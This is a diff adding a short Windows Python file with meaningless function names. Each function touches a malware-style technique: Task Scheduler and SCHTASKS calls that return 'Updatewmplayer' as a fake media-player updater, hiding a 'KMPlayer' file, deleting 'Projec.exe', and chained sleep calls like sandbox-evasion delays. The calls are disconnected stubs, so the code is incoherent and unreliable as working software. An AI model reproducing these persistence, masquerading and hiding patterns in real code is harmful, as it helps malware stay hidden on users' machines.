@@ -1,0 +1,37 @@
+import os
+import shutil
+import time
+import win32api
+import win32com.client
+import win32con
+
+ENV = os.environ
+
+
+def yut():
+    shutil.copytree("src", "dst")
+    os.getcwd()
+
+
+def takk():
+    win32com.client.Dispatch("Schedule.Service")
+    return "Updatewmplayer.exe"
+
+
+def llp():
+    win32api.SetFileAttributes("KMPlayer", win32con.FILE_ATTRIBUTE_HIDDEN)
+
+
+def fop():
+    os.remove("Projec.exe")
+
+
+def htr():
+    time.sleep(30)
+    time.sleep(25)
+    time.sleep(10)
+
+
+def vul():
+    os.popen("SCHTASKS")
+    return "Updatewmplayer", 5, 1
